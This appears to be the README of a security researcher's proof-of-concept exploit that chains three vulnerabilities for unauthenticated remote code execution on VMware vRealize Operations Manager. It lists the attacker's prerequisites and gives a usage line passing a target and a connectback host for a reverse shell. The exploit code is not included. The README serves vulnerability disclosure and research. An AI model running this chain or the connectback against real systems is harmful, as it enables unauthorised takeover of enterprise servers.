# DashOverride

## What

This is a pre-authenticated RCE exploit for VMware vRealize Operations Manager (vROPS) that impacts versions <= 8.6.3.19682901.

## Author

Steven Seeley of Qihoo 360 Vulnerability Research Insititute

## Tested

The exploit was tested against 8.6.3.19682901 using the file `vRealize-Operations-Manager-Appliance-8.6.3.19682901_OVF10.ova` (SHA1: 4637b6385db4fbee6b1150605087197f8d03ba00) but it has known to work against other older versions as well.

## Notes

- This exploit chains three vulnerabilities that have been [patched](TODO). More details can be found in the [blog post](http://localhost:4000/blog/2022/01/26/from-shared-dash-to-root-bash-pwning-vmware-vrealize-operations-manager.html):

  - [CVE-TODO - MainPortalFilter ui Authentication Bypass](https://srcincite.io/advisories/src-2022-0015/)
  - [CVE-TODO - SupportLogAction Information Disclosure](https://srcincite.io/advisories/src-2022-0016/)
  - [CVE-TODO - generateSupportBundle VCOPS_BASE Privilege Escalation](https://srcincite.io/advisories/src-2022-0017/)

- This exploit will require the attacker to supply:

  - A valid dashboardlink token that will be used to bypass authentication.
  - Their own SMTP server settings, this is to ensure that exploitation works.
  - A valid Pak file that is signed by VMWare such as `APUAT-8.5.0.18176777.pak`.

- There is alot of moving parts to this exploit, hopefully I engineered it right so it works on the first shot.
- The exploit takes on average ~1m34.142s to complete (tested 5 times), I tried to engineer this to be faster, but it's within an allocated time for a competition ;->

## Run

```
researcher@mars:~$ ./poc.py 
(+) usage: ./poc.py <target> <connectback> <dashboardlink_token>
(+) eg: ./poc.py 192.168.2.196 192.168.2.234 uuncuybis9
```

## Example

![Running DashOverride](/poc.gif)
